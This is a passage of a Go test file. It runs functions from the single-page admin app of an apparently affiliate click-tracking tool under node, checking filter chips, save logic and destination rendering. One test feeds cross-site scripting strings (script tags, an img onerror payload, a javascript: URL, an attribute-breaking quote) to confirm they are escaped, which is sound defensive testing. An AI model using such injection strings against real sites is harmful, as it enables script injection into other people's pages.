	must(t, spaFunctionLine(html, "dirtyChipsHTML"), `class="dchip-t"`, "the label is the piece that can move")
	must(t, spaFunctionLine(html, "syncSaveBar"), "fitDchips(q('#dchips',bar))", "chips are measured after they are drawn")

	node, err := exec.LookPath("node")
	if err != nil {
		t.Skip("node not found — skipping the chip overflow checks")
	}
	var b strings.Builder
	for _, name := range []string{"dchipOverflow", "markDchipRun"} {
		fn := spaFunctionLine(html, name)
		if fn == "" {
			t.Fatalf("%s not found in SPA", name)
		}
		b.WriteString(fn)
		b.WriteByte('\n')
	}
	b.WriteString(`
let failed = 0;
const eq = (got, want, what) => {
  const g = JSON.stringify(got), w = JSON.stringify(want);
  if (g !== w) { failed++; console.log('FAIL ' + what + '\n  got  ' + g + '\n  want ' + w); }
};
eq(dchipOverflow(400, 170), true, 'a long label overflows');
eq(dchipOverflow(172, 170), true, 'two pixels over still overflows');
eq(dchipOverflow(171, 170), false, 'one pixel is not enough to scroll');
eq(dchipOverflow(170, 170), false, 'an exact fit stays still');
eq(dchipOverflow(40, 170), false, 'a short label stays still');
const style = () => ({props:{}, setProperty(k,v){this.props[k]=v}, removeProperty(k){delete this.props[k]}});
const long = {dataset:{}, style:style()};
markDchipRun(long, 400, 170);
eq(long.dataset.run, '', 'a long label is marked to scroll');
eq(long.style.props['--dchip-shift'], '-230px', 'the shift reaches the end of the label');
const short = {dataset:{run:''}, style:style()};
short.style.props['--dchip-shift'] = '-9px';
markDchipRun(short, 80, 170);
eq(short.dataset.run, undefined, 'a short label is not marked');
eq(short.style.props['--dchip-shift'], undefined, 'a short label has no shift');
if (failed) { console.log(failed + ' check(s) failed'); process.exit(1); }
`)
	f := filepath.Join(t.TempDir(), "dchip-run.js")
	if err := os.WriteFile(f, []byte(b.String()), 0o644); err != nil {
		t.Fatal(err)
	}
	if out, err := exec.Command(node, f).CombinedOutput(); err != nil {
		t.Errorf("chip overflow checks failed:\n%s", out)
	}
}

// TestFilterChipDrop runs condSig and dropCond under node and checks the chip wiring: a chip removes its
// condition from the list current at click time even after the page replaced the array or reordered it.
func TestFilterChipDrop(t *testing.T) {
	node, err := exec.LookPath("node")
	if err != nil {
		t.Skip("node not found — skipping the filter chip checks")
	}
	html := spaSource()
	var b strings.Builder
	for _, name := range []string{"condSig", "dropCond"} {
		fn := spaFunctionLine(html, name)
		if fn == "" {
			t.Fatalf("%s not found in SPA", name)
		}
		b.WriteString(fn)
		b.WriteByte('\n')
	}
	b.WriteString(`
let failed = 0;
const eq = (got, want, what) => {
  const g = JSON.stringify(got), w = JSON.stringify(want);
  if (g !== w) { failed++; console.log('FAIL ' + what + '\n  got  ' + g + '\n  want ' + w); }
};
const a = {f:'country', op:'eq', v:['US']}, b = {f:'ip', op:'in', v:['1.1.1.1','2.2.2.2']};
const sigA = condSig(a), sigB = condSig(b);
eq(sigA === sigB, false, 'different conditions have different signatures');
eq(condSig({f:'country', v:['US']}), sigA, 'a missing operator is eq');
eq(condSig({f:'country', op:'eq', v:['DE']}) === sigA, false, 'values are part of the identity');
eq(condSig(null), '["","eq",[]]', 'no condition has an empty signature');
// the page replaced the array after the chips were painted: the signature still finds the condition
const live = [{f:'ip', op:'eq', v:['9.9.9.9']}, {f:'country', op:'eq', v:['US']}, {f:'ip', op:'in', v:['1.1.1.1','2.2.2.2']}];
eq(dropCond(live, sigA), true, 'the condition is removed from the live list');
eq(live.map(c => c.f + c.op), ['ipeq', 'ipin'], 'the others stay in order');
eq(dropCond(live, sigA), false, 'a second removal finds nothing');
eq(dropCond(live, sigB), true, 'the second condition is removed');
eq(live.length, 1, 'one condition remains');
eq(dropCond(null, sigA), false, 'no list, nothing removed');
if (failed) { console.log(failed + ' check(s) failed'); process.exit(1); }
`)
	f := filepath.Join(t.TempDir(), "chip-drop.js")
	if err := os.WriteFile(f, []byte(b.String()), 0o644); err != nil {
		t.Fatal(err)
	}
	if out, err := exec.Command(node, f).CombinedOutput(); err != nil {
		t.Errorf("filter chip checks failed:\n%s", out)
	}

	bar := spaFunctionLine(html, "paintFilterBar")
	must(t, bar, "dropCond(live(), b.dataset.dropCond)", "a chip removes through the live list")
	mustNot(t, bar, "list.splice(", "a chip does not change the array captured at paint time")
	reload := spaBetween(html, "const reloadLogs=()=>{", "q('#log-filters').onclick")
	mustNot(t, reload, "syncLogIpFromField()", "the chip list is the truth on reload: the IP field must not put a removed IP condition back")
	must(t, reload, "ip.value=hit&&hit.v&&hit.v[0]||''", "the IP field follows the conditions")
	for _, call := range []string{"()=>LOGF.conds", "()=>PB.conds", "()=>REP.conds"} {
		must(t, html, call+", ", "paintFilterBar takes "+call+" so a replaced array is still the one edited")
	}
}

// TestLogIPFieldRepaintsChips runs syncLogIpFromField under node and checks the IP field wiring of the click
// log: the sync reports a change only when the ip condition changed, and Enter and change go through
// reloadLogs, the same repaint the filter modal and the chips use, so the chip and the counter follow at once.
func TestLogIPFieldRepaintsChips(t *testing.T) {
	node, err := exec.LookPath("node")
	if err != nil {
		t.Skip("node not found — skipping the IP field checks")
	}
	html := spaSource()
	fn := spaFunctionLine(html, "syncLogIpFromField")
	if fn == "" {
		t.Fatal("syncLogIpFromField not found in SPA")
	}
	script := `
let failed = 0;
const eq = (got, want, what) => {
  const g = JSON.stringify(got), w = JSON.stringify(want);
  if (g !== w) { failed++; console.log('FAIL ' + what + '\n  got  ' + g + '\n  want ' + w); }
};
let LOGF = {conds:[{f:'country', op:'eq', v:['US']}]};
const field = {value:''};
let present = true;
const q = () => present ? field : null;
` + fn + `
field.value = ' 1.2.3.4 ';
eq(syncLogIpFromField(), true, 'a typed IP changes the conditions');
eq(LOGF.conds, [{f:'country', op:'eq', v:['US']}, {f:'ip', op:'eq', v:['1.2.3.4']}], 'the IP is trimmed and appended');
eq(syncLogIpFromField(), false, 'the same IP changes nothing');
field.value = '5.6.7.8';
eq(syncLogIpFromField(), true, 'another IP replaces the condition');
eq(LOGF.conds.filter(c => c.f === 'ip').length, 1, 'one ip condition');
field.value = '';
eq(syncLogIpFromField(), true, 'clearing the field drops the condition');
eq(LOGF.conds, [{f:'country', op:'eq', v:['US']}], 'only the other condition remains');
eq(syncLogIpFromField(), false, 'an empty field with no condition changes nothing');
LOGF = {conds:[{f:'ip', op:'in', v:['9.9.9.9']}]};
field.value = '';
eq(syncLogIpFromField(), false, 'an in condition on ip is not the field condition');
eq(LOGF.conds.length, 1, 'the in condition stays');
present = false;
eq(syncLogIpFromField(), false, 'no field, no change');
if (failed) { console.log(failed + ' check(s) failed'); process.exit(1); }
`
	f := filepath.Join(t.TempDir(), "log-ip.js")
	if err := os.WriteFile(f, []byte(script), 0o644); err != nil {
		t.Fatal(err)
	}
	if out, err := exec.Command(node, f).CombinedOutput(); err != nil {
		t.Errorf("log IP field checks failed:\n%s", out)
	}

	wire := spaBetween(html, "const applyIp=force=>", "paintFilterBar('events'")
	must(t, wire, "if(syncLogIpFromField()||force) reloadLogs()", "applying the IP repaints through reloadLogs")
	must(t, wire, "ipEl.onchange=()=>applyIp(false)", "leaving the field applies the IP")
	must(t, wire, "applyIp(true)", "Enter applies the IP")
	mustNot(t, wire, "ipEl.onblur", "blur must not sync the field before change reports it")
	if regexp.MustCompile(`(^|[^A-Za-z])loadLogs\(`).MatchString(wire) {
		t.Error("the IP handlers must reload only through reloadLogs")
	}
}

// TestKeepUnknownFlowLogic runs flowPickOpts under node: a "send to campaign" select keeps a saved
// campaign id the list lacks as its one selected option, so the form reads back the same id and
// the campaign settles clean.
func TestKeepUnknownFlowLogic(t *testing.T) {
	node, err := exec.LookPath("node")
	if err != nil {
		t.Skip("node not found — skipping the campaign picker checks")
	}
	html := spaSource()
	var src strings.Builder
	src.WriteString("const esc=s=>String(s); const opt=(v,l,cur)=>`<option value=\"${esc(v)}\"${String(cur)===String(v)?' selected':''}>${esc(l)}</option>`; const trFill=(k,p)=>k+':'+p.id;\n")
	for _, name := range []string{"unknownPick", "missingOpt", "flowPickOpts", "flowOpt"} {
		fn := spaFunctionLine(html, name)
		end := strings.Index(fn, "\n}\n")
		if end < 0 {
			t.Fatalf("%s not found in SPA", name)
		}
		src.WriteString(fn[:end+2] + "\n")
	}
	src.WriteString(`
let failed = 0;
const eq = (got, want, what) => { if (got !== want) { failed++; console.log('FAIL ' + what + ': got ' + got + ', want ' + want); } };
const picked = h => (h.match(/<option value="([^"]*)"[^>]* selected/g) || []).map(s => s.match(/value="([^"]*)"/)[1]);
const rows = [{id: 'a', name: 'A'}, {id: 'b'}];
let h = flowPickOpts(rows, ' gone ');
eq(picked(h).join(','), 'gone', 'a missing campaign is the one selected option');
eq(h.includes('class="miss"') && h.includes('pick.missing.flow:gone'), true, 'it is labelled as not found');
h = flowPickOpts(rows, 'b');
eq(picked(h).join(','), 'b', 'a listed campaign is selected as is');
eq(h.includes('class="miss"'), false, 'a listed campaign adds no extra option');
eq(flowPickOpts(rows, '').includes('selected'), false, 'no target selects nothing');
eq(flowPickOpts(rows, null).includes('selected'), false, 'an unset target selects nothing');
eq(picked(flowPickOpts([], '849')).join(','), '849', 'an empty list still keeps the id');
eq(h.includes('>a — A</option>'), true, 'listed campaigns show id and name');
if (failed) process.exit(1);
`)
	f := filepath.Join(t.TempDir(), "flowpick.js")
	if err := os.WriteFile(f, []byte(src.String()), 0o644); err != nil {
		t.Fatal(err)
	}
	if out, err := exec.Command(node, f).CombinedOutput(); err != nil {
		t.Errorf("campaign picker checks failed:\n%s", out)
	}
}

// TestSaveBarSettleLogic runs markDirty and settleGroups under node: an untouched campaign that an
// editor rewrites (defaults) stays clean, a real edit marks it, and putting the value back clears it.
func TestSaveBarSettleLogic(t *testing.T) {
	node, err := exec.LookPath("node")
	if err != nil {
		t.Skip("node not found — skipping the save bar checks")
	}
	html := spaSource()
	var src strings.Builder
	src.WriteString("const SNAP=new Map(), DIRTY=new Set(); let synced=0; function syncSaveBar(){synced++}\n")
	src.WriteString(sharedListsDecl)
	for _, name := range []string{"groupJSON", "markDirty", "settleGroups"} {
		fn := spaFunctionLine(html, name)
		if fn == "" {
			t.Fatalf("%s not found in SPA", name)
		}
		src.WriteString(fn + "\n")
	}
	src.WriteString(`
let failed = 0;
const eq = (got, want, what) => { if (got !== want) { failed++; console.log('FAIL ' + what + ': got ' + got + ', want ' + want); } };
const load = (g) => { SNAP.set(g, {id: g.id, json: JSON.stringify(g)}); return g; };

const g = load({id: 'a', name: 'n'});
g.firewall = {enabled: false};
settleGroups(g);
eq(DIRTY.has(g), false, 'form normalisation of an untouched campaign is not a change');
g.name = 'edited';
markDirty(g);
eq(DIRTY.has(g), true, 'an edit marks the campaign');
g.name = 'n';
markDirty(g);
eq(DIRTY.has(g), false, 'putting the value back clears the mark');

const h = load({id: 'b', name: 'x'});
h.name = 'y';
markDirty(h);
h.extra = 1;
settleGroups(h);
eq(DIRTY.has(h), true, 'a changed campaign stays changed when settled');

const fresh = {id: 'c'};
settleGroups(fresh);
eq(DIRTY.has(fresh), true, 'a never-saved campaign is dirty');
settleGroups(undefined);
settleGroups([null, 5]);
eq(synced > 0, true, 'the bar is refreshed');
if (failed) process.exit(1);
`)
	f := filepath.Join(t.TempDir(), "savebar.js")
	if err := os.WriteFile(f, []byte(src.String()), 0o644); err != nil {
		t.Fatal(err)
	}
	if out, err := exec.Command(node, f).CombinedOutput(); err != nil {
		t.Errorf("save bar checks failed:\n%s", out)
	}
}

// TestSaveFlowsPointLogic runs saveFlows under node with a recording call: a copy is sent alone with
// PUT /api/groups/{id}, a changed id goes as PUT on the saved id (a rename, never a DELETE of the old row),
// a campaign whose only change is the link the rename moved is not sent again, a failed rename keeps the draft,
// and a list longer than FLOW_WHOLE_MAX is saved campaign by campaign even with many changes.
func TestSaveFlowsPointLogic(t *testing.T) {
	node, err := exec.LookPath("node")
	if err != nil {
		t.Skip("node not found — skipping the campaign save checks")
	}
	html := spaSource()
	var src strings.Builder
	src.WriteString("const SNAP=new Map(), DIRTY=new Set(), DELETED=new Set(); let GROUPS=[], calls=[], fail=null;\n")
	src.WriteString("function syncSaveBar(){} async function flushIPDraft(){}\n")
	src.WriteString("async function call(m,p,b){calls.push(m+' '+p+(Array.isArray(b)?' list':'')); if(fail&&fail(m,p)){const e=new Error('campaign id is taken: x'); e.status=409; throw e} return {status:'saved'}}\n")
	src.WriteString(sharedListsDecl)
	for _, name := range []string{"groupJSON", "groupParse", "markDirty", "snapshotGroups", "moveFlowLinks", "settleMovedLinks", "adoptRelinked", "saveFlows"} {
		fn := spaFunctionLine(html, name)
		if fn == "" {
			t.Fatalf("%s not found in SPA", name)
		}
		if strings.Contains(html, "async function "+name+"(") {
			fn = "async " + fn
		}
		src.WriteString(fn + "\n")
	}
	src.WriteString(`
let failed = 0;
const eq = (got, want, what) => { const g = JSON.stringify(got), w = JSON.stringify(want); if (g !== w) { failed++; console.log('FAIL ' + what + ': got ' + g + ', want ' + w); } };
(async () => {
  const many = Array.from({length: 30}, (_, i) => ({id: 'c' + i, name: 'C' + i}));
  const src = {id: 'a', name: 'A'};
  const hub = {id: 'hub', redirect: 'group', out: 'a', streams: [{name: 's', out: {redirect: 'group', out: 'a'}}]};
  GROUPS = [src, hub, ...many];
  snapshotGroups();
  const copy = {id: 'a_copy', name: 'A (copy)'};
  GROUPS.splice(1, 0, copy);
  markDirty(copy);
  await saveFlows();
  eq(calls, ['PUT /api/groups/a_copy'], 'a copy is sent alone');
  eq(DIRTY.size, 0, 'the copy is saved');

  calls = [];
  src.id = 'fresh';
  moveFlowLinks(hub, 'a', 'fresh');
  markDirty([src, hub]);
  await saveFlows();
  eq(calls, ['PUT /api/groups/a'], 'a rename is one PUT on the saved id; the moved link is not sent again');
  eq(hub.out + '/' + hub.streams[0].out.out, 'fresh/fresh', 'links follow the new id');
  eq(SNAP.get(src).id, 'fresh', 'the snapshot takes the new id');

  calls = [];
  src.id = 'taken';
  markDirty(src);
  fail = (m, p) => m === 'PUT' && p === '/api/groups/fresh';
  let err = null;
  try { await saveFlows(); } catch (e) { err = e; }
  eq(err && err.status, 409, 'a refused rename throws');
  eq(calls, ['PUT /api/groups/fresh'], 'a refused rename deletes nothing');
  eq(DIRTY.has(src), true, 'a refused rename keeps the draft');
  fail = null;
  src.id = 'fresh';
  markDirty(src);

  calls = [];
  many.forEach(g => { g.name += '!'; markDirty(g); });
  await saveFlows();
  eq(calls, ['PUT /api/groups list'], 'many changes send the whole list');

  calls = [];
  GROUPS = Array.from({length: FLOW_WHOLE_MAX + 1}, (_, i) => ({id: 'b' + i, name: 'B' + i}));
  snapshotGroups();
  GROUPS.slice(0, 25).forEach(g => { g.status = false; markDirty(g); });
  await saveFlows();
  eq(calls.length, 25, 'a long list is never sent whole');
  eq(calls.every(c => /^PUT \/api\/groups\/b\d+$/.test(c)), true, 'a long list saves each changed campaign alone');
  eq(DIRTY.size, 0, 'every changed campaign of a long list is saved');
  if (failed) process.exit(1);
})();
`)
	f := filepath.Join(t.TempDir(), "saveflows.js")
	if err := os.WriteFile(f, []byte(src.String()), 0o644); err != nil {
		t.Fatal(err)
	}
	if out, err := exec.Command(node, f).CombinedOutput(); err != nil {
		t.Errorf("campaign save checks failed:\n%s", out)
	}
}

// TestEnsureNumsBaseline runs ensureNums under node: numbering old campaigns on the list page does
// not mark them changed, a create or copy saves the numbers it builds on, and nothing is renumbered.
func TestEnsureNumsBaseline(t *testing.T) {
	node, err := exec.LookPath("node")
	if err != nil {
		t.Skip("node not found — skipping the numbering checks")
	}
	html := spaSource()
	var src strings.Builder
	src.WriteString("const SNAP=new Map(), DIRTY=new Set(); let GROUPS=null; let synced=0; function syncSaveBar(){synced++}\n")
	src.WriteString(sharedListsDecl)
	for _, name := range []string{"groupJSON", "markDirty", "settleGroups", "nextNum", "ensureNums"} {
		fn := spaFunctionLine(html, name)
		if fn == "" {
			t.Fatalf("%s not found in SPA", name)
		}
		src.WriteString(fn + "\n")
	}
	src.WriteString(`
let failed = 0;
const eq = (got, want, what) => { if (got !== want) { failed++; console.log('FAIL ' + what + ': got ' + got + ', want ' + want); } };
const load = (g) => { SNAP.set(g, {id: g.id, json: JSON.stringify(g)}); return g; };
const reset = () => { SNAP.clear(); DIRTY.clear(); };

reset();
const a = load({id: 'a', num: 7}), b = load({id: 'b'}), c = load({id: 'c'});
GROUPS = [a, b, c];
ensureNums();
eq(b.num, 8, 'the first old campaign gets the next number');
eq(c.num, 9, 'the next one follows');
eq(a.num, 7, 'a numbered campaign keeps its number');
eq(DIRTY.size, 0, 'numbering on the list page is not an edit');
b.name = 'edited';
markDirty(b);
eq(DIRTY.has(b), true, 'a real edit after numbering still marks the campaign');
b.name = undefined; delete b.name;
markDirty(b);
eq(DIRTY.has(b), false, 'reverting the edit clears the mark against the numbered baseline');

reset();
const d = load({id: 'd'}), e = load({id: 'e', num: 3});
GROUPS = [d, e];
ensureNums(true);
eq(d.num, 4, 'a create numbers the old campaign first');
eq(DIRTY.has(d), true, 'the numbers a create builds on are saved');
eq(DIRTY.has(e), false, 'a numbered campaign is left alone');

reset();
const f = {id: 'f'};
GROUPS = [f];
ensureNums();
eq(f.num, 1, 'a never-saved campaign is numbered');
eq(DIRTY.has(f), true, 'a never-saved campaign stays unsaved');
GROUPS = null;
ensureNums();
if (failed) process.exit(1);
`)
	f := filepath.Join(t.TempDir(), "ensure-nums.js")
	if err := os.WriteFile(f, []byte(src.String()), 0o644); err != nil {
		t.Fatal(err)
	}
	if out, err := exec.Command(node, f).CombinedOutput(); err != nil {
		t.Errorf("numbering checks failed:\n%s", out)
	}
}

// TestDestinationEscapeLogic runs recentDest and destHTML under node with hostile values: the
// destination, the landing id and a campaign name with markup or quotes are escaped, and no
// address of the click ever becomes a link, so a javascript: destination stays plain text.
func TestDestinationEscapeLogic(t *testing.T) {
	node, err := exec.LookPath("node")
	if err != nil {
		t.Skip("node not found — skipping the destination checks")
	}
	html := spaSource()
	var src strings.Builder
	src.WriteString(spaBetween(html, "const esc=(s)=>", "\n") + "\n")
	src.WriteString("const tr=k=>k; const pageAllowed=()=>true; let ME={}, OFFERS=[], NETS=[], SOURCES=[], LANDINGS=[], GROUPS=[];\n")
	src.WriteString("const NOOUT=new Set(['stop','landing']); const typeLabel=t=>'type:'+(t||'-');\n")
	src.WriteString("const groupById=(id)=>(GROUPS||[]).find(g=>g.id===id||(g.aliases||[]).includes(id))||null;\n")
	for _, name := range []string{"nameOf", "campaignLabel", "idLabel", "entityRow", "entityHTML", "recentDest", "destHTML"} {
		fn := spaFunctionLine(html, name)
		if fn == "" {
			t.Fatalf("%s not found in SPA", name)
		}
		src.WriteString(fn + "\n")
	}
	src.WriteString(`
let failed = 0;
const eq = (got, want, what) => { if (got !== want) { failed++; console.log('FAIL ' + what + '\n  got  ' + got + '\n  want ' + want); } };
const evil = '<script>alert("x")</script>';
const clean = (h, what) => { eq(h.includes('<script'), false, what + ': no raw script tag'); eq(h.includes('<img'), false, what + ': no raw img tag'); };

LANDINGS = [{id: 'lp"1', name: evil}];
GROUPS = [{id: '7', name: evil}];
let h = destHTML({redirect: 'landing', landing_id: 'lp"1'});
clean(h, 'landing name');
eq(h.includes('&lt;script&gt;alert(&quot;x&quot;)&lt;/script&gt;'), true, 'landing name is escaped text');
eq(h.includes('href="#/landings/lp%221"'), true, 'landing link is an in-app address with the id encoded');
eq(h.includes('title="lp&quot;1"'), true, 'landing id in the tooltip is escaped');
eq(recentDest({redirect: 'landing', landing_id: 'lp"1'}), 'LP · ' + evil, 'recentDest keeps plain text for the caller to escape');

h = destHTML({redirect: 'landing', landing_id: '"><img src=x onerror=alert(1)>'});
eq(h, 'LP', 'a landing outside the catalog shows only LP, never its id');

h = destHTML({redirect: 'landing', out: '"><img src=x>'});
eq(h, 'LP', 'a landing id taken from out is not echoed either');

h = destHTML({redirect: 'group', out: '7'});
clean(h, 'campaign name');
eq(h.includes('href="#/flows/7"'), true, 'campaign link keeps the slug address');
eq(h.includes('&lt;script&gt;'), true, 'campaign name is escaped text');
eq(recentDest({redirect: 'group', out: '7'}), evil, 'recentDest gives the campaign name as plain text');

h = destHTML({redirect: 'group', out: '<img src=x onerror=1>'});
clean(h, 'unknown campaign target');
eq(h, '<span title="&lt;img src=x onerror=1&gt;">&lt;img src=x onerror=1&gt;</span>', 'an unknown campaign target is escaped text, not a link');

h = destHTML({redirect: 'http_redirect', out: 'javascript:alert(1)'});
eq(h.includes('<a '), false, 'a javascript: destination is not a link');
eq(h.includes('href'), false, 'a javascript: destination has no href');
eq(h, '<span title="javascript:alert(1)">javascript:alert(1)</span>', 'a javascript: destination is plain text');

h = destHTML({redirect: 'http_redirect', out: 'https://a.example/?q="x" onmouseover="y"'});
eq((h.match(/"/g) || []).length, 2, 'quotes in the destination cannot leave the title attribute');
eq(h.includes('&quot;x&quot; onmouseover=&quot;y&quot;'), true, 'quotes in the destination are escaped');
eq(h.includes('<a '), false, 'an http destination is text too');

h = destHTML({redirect: 'show_text', out: evil});
clean(h, 'destination with markup');
eq(h, '<span title="type:show_text">type:show_text</span>', 'a body with markup shows the type label');
eq(recentDest({redirect: 'http_redirect', out: 'line\nbreak'}), 'type:http_redirect', 'a multi-line destination shows the type label');
eq(recentDest({redirect: 'stop', out: 'x'}), 'type:stop', 'a type without an address shows the type label');
eq(recentDest({redirect: '', out: ''}), 'type:-', 'a row with no type and no address shows the placeholder');
if (failed) process.exit(1);
`)
	f := filepath.Join(t.TempDir(), "destination.js")
	if err := os.WriteFile(f, []byte(src.String()), 0o644); err != nil {
		t.Fatal(err)
	}
	if out, err := exec.Command(node, f).CombinedOutput(); err != nil {
		t.Errorf("destination checks failed:\n%s", out)
	}
}

// TestFlowDestMarks checks the stream destination markup: an expanded row names the selected
// offer, a compact row shows a badge and the share percent, extra offers fold into +N, and a
// stream that only has its own URL (even with offer_id in the query) gets no empty badge.
// Catalog rows in the fixture are switched on: a missing status is a stopped offer and paints the red badge.
func TestFlowDestMarks(t *testing.T) {
	node, err := exec.LookPath("node")
	if err != nil {
		t.Skip("node not found — skipping the stream destination marks")
	}
	html := spaSource()
	if !strings.Contains(html, "${isLink?'':flowDestMarks(o, flowDestNamed(") {
		t.Fatal("the stream row does not draw offer and landing marks")
	}
	if !strings.Contains(html, ":flowDestURL(o)}") {
		t.Fatal("the stream row does not keep the destination address")
	}
	if !strings.Contains(spaFunctionLine(html, "flowPage"), "ensureCatalogs()") {
		t.Fatal("the campaign page does not load offer names before drawing streams")
	}
	var src strings.Builder
	src.WriteString("const esc=(s)=>String(s==null?'':s).replace(/[&<>\"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','\"':'&quot;',\"'\":'&#39;'}[c]));\n")
	src.WriteString("const tr=k=>k; const trFill=(k,map)=>k+' '+(map&&map.n);\n")
	src.WriteString("let OFFERS=[], LANDINGS=[];\n")
	mark := strings.Index(html, "const FLOW_DEST_BADGES=")
	if mark < 0 {
		t.Fatal("FLOW_DEST_BADGES is missing")
	}
	line := html[mark:]
	nl := strings.Index(line, "\n")
	src.WriteString(line[:nl+1])
	for _, name := range []string{"thenURL", "thenLive", "thenMode", "nameOf", "flowSharePcts", "flowDestLabel", "flowOfferStopped", "flowDestItems", "flowDestTip", "flowDestOfferBadge", "flowDestMarks", "flowDestURL"} {
		fn := spaFunctionLine(html, name)
		if fn == "" {
			t.Fatalf("%s not found in SPA", name)
		}
		src.WriteString(fn + "\n")
	}
	src.WriteString(`
let failed = 0;
const eq = (got, want, what) => { if (got !== want) { failed++; console.log('FAIL ' + what + '\n  got  ' + got + '\n  want ' + want); } };
const part = (h, a, b) => { const i = h.indexOf(a); return i < 0 ? '' : h.slice(i, b ? h.indexOf(b, i) : h.length); };
const shown = h => h.replace(/ title="[^"]*"/g, '');

OFFERS = [{id:'o1', name:'Alpha', status:true},{id:'o2', name:'Beta', status:true},{id:'o3', name:'Gamma', status:true},{id:'o4', name:'<Delta>', status:true}];
LANDINGS = [{id:'l1', name:'Land'}];

let h = flowDestMarks({redirect:'http_redirect', offers:[{id:'o1', share:100}]});
eq(shown(h).includes('>Alpha<'), true, 'the row contains the offer name');
eq(shown(h).includes('>100%<'), true, 'the row contains the share percent');
eq((h.match(/title="([^"]*)"/) || ['',''])[1].includes('Alpha — 100%'), true, 'the tooltip keeps the full name and the percent');
eq(part(h, 'class="badges"').includes('class="pill"'), true, 'the row uses a badge');

h = flowDestMarks({redirect:'http_redirect', offers:[{id:'o1',share:60},{id:'o2',share:40}]});
eq(shown(h).includes('>60%<'), true, 'share 60 stays 60 percent');
eq(shown(h).includes('>40%<'), true, 'share 40 stays 40 percent');
eq(part(h, 'class="badges"').includes('class="pill more"'), false, 'two offers do not fold');

h = flowDestMarks({redirect:'http_redirect', offers:[{id:'o1',share:1},{id:'o2',share:1},{id:'o3',share:1},{id:'o4',share:1}]});
eq(h.includes('&lt;Delta&gt;'), true, 'offer name is escaped in the tooltip');
eq(h.includes('<Delta>'), false, 'offer name is not raw markup');
eq(shown(h).includes('Gamma'), false, 'an extra offer is not painted in the row');
eq(part(h, 'class="badges"').includes('>+2<'), true, 'extra offers fold into +N');
eq(h.includes('(0%)'), false, '+N of offers above zero is not the zero badge');
eq((shown(h).match(/<span class="pill"/g) || []).length, 2, 'the row keeps two badges before +N');
eq((h.match(/title="([^"]*)"/) || ['',''])[1].includes('Gamma — 25%'), true, 'a folded offer stays in the tooltip');

h = flowDestMarks({redirect:'http_redirect', out:'https://click.1cclick.com/click?pid=622&offer_id=6004'});
eq(h, '', 'a URL with offer_id and no selected offer has no badge');
eq(h.includes('6004'), false, 'offer_id from the query is not shown');

h = flowDestMarks({redirect:'http_redirect', offers:[{id:'', share:100}], out:'https://example.com'});
eq(h, '', 'an empty offer id is not a badge');

h = flowDestMarks({redirect:'http_redirect', offers:[{id:'o1', share:0},{id:'o2', share:0}]});
eq(shown(h).includes('>50%<'), true, 'zero shares split equally and stay in the row');
eq(h.includes('(0%)'), false, 'an equal split of empty shares is not a zero badge');

h = flowDestMarks({redirect:'http_redirect', offers:[{id:'o1',share:0},{id:'o2',share:0},{id:'o3',share:100}]});
eq(shown(h).includes('>Gamma<'), true, 'the offer that receives traffic is in the row');
eq(shown(h).includes('>100%<'), true, 'a lone positive share is 100 percent');
eq(shown(h).includes('Alpha'), false, 'a zero share is not in the visible row');
eq(shown(h).includes('>0%<'), false, 'a zero percent is not in the visible row');
eq(shown(h).includes('>+2 (0%)<'), true, 'zero shares are one +N (0%) badge');
eq((h.match(/title="([^"]*)"/) || ['',''])[1].includes('Alpha — 0%'), true, 'a zero share is in the title');
const zeroBadge = (h.match(/<span class="pill more" title="([^"]*)">\+2 \(0%\)<\/span>/) || ['',''])[1];
eq(zeroBadge.includes('Alpha — 0%'), true, 'the zero badge title names Alpha');
eq(zeroBadge.includes('Beta — 0%'), true, 'the zero badge title names Beta');
eq(flowDestTip({redirect:'http_redirect', offers:[{id:'o1',share:0},{id:'o3',share:100}]}).includes('Alpha — 0%'), true, 'the destination tooltip lists a zero share');

OFFERS = [{id:'807', name:'', status:true},{id:'1046', name:'Awintura', status:true}];
h = flowDestMarks({redirect:'http_redirect', offers:[{id:'807',share:50},{id:'1046',share:50}]});
eq(h.includes('807'), false, 'a numeric id without a name is not a badge');
eq(shown(h).includes('>Awintura<'), true, 'the catalog name is the badge');

OFFERS = [{id:'o1', name:'   ', status:true}];
h = flowDestMarks({redirect:'http_redirect', offers:[{id:'o1', share:100}]});
eq(shown(h).includes('>o1<'), true, 'a blank name of a non-numeric id stays the id');
eq(/<span class="nm"><\/span>/.test(h), false, 'a blank name is not an empty badge');

OFFERS = [{id:'o1', name:'Alpha', status:true}];
LANDINGS = [{id:'l1', name:'Land'}];
h = flowDestMarks({redirect:'http_redirect', landings:[{id:'l1', share:100}]});
eq(shown(h).includes('>Land<'), true, 'the row shows the landing name');
eq(shown(h).includes('>100%<'), true, 'landing badge has its share');

const NOOUT = new Set();
function outHTML(red, out){ return '<div class="out">'+String(out||'')+'</div>'; }
OFFERS = [{id:'o1', name:'Alpha', status:true},{id:'o3', name:'Gamma', status:true}];
let u = flowDestURL({redirect:'http_redirect', offers:[{id:'o1', share:50},{id:'o3', share:50}], out:'https://1wyvdy.life/casino/list?open=register'});
eq(u, '', 'selected offers hide the saved URL');
eq(flowDestMarks({redirect:'http_redirect', offers:[{id:'o1', share:50},{id:'o3', share:50}]}).includes('>50%<'), true, 'those offers still show their percent');
u = flowDestURL({redirect:'http_redirect', out:'https://1wyvdy.life/casino/list?open=register'});
eq(u.includes('https://1wyvdy.life/casino/list?open=register'), true, 'a direct URL stays the link');
eq(flowDestMarks({redirect:'http_redirect', out:'https://1wyvdy.life/casino/list?open=register'}), '', 'a direct URL has no offer badges');
u = flowDestURL({redirect:'http_redirect', offers:[{id:'o1',share:0},{id:'o3',share:100}], out:'https://example.com/go'});
eq(u, '', 'a positive offer share hides the URL');
OFFERS = [{id:'807', name:'', status:true}];
u = flowDestURL({redirect:'http_redirect', offers:[{id:'807', share:100}], out:'https://example.com/only'});
eq(u.includes('https://example.com/only'), true, 'a nameless numeric id leaves the link');

if (failed) process.exit(1);
`)
	f := filepath.Join(t.TempDir(), "flowdest.js")
	if err := os.WriteFile(f, []byte(src.String()), 0o644); err != nil {
		t.Fatal(err)
	}
	if out, err := exec.Command(node, f).CombinedOutput(); err != nil {
		t.Errorf("stream destination marks failed:\n%s", out)
	}
}

// TestFlowDestOfferStats checks the destination block: the collapsed card is one stream
// total and a row of badges, the detailed row is one line per offer before the report
// and after it, a direct URL stays one stream summary, and an offer label differs from a direct URL.
// Catalog rows in the fixture are switched on, so the badge stays gray and the title is the name and the percent.
func TestFlowDestOfferStats(t *testing.T) {
	node, err := exec.LookPath("node")
	if err != nil {
		t.Skip("node not found — skipping the stream destination stats")
	}
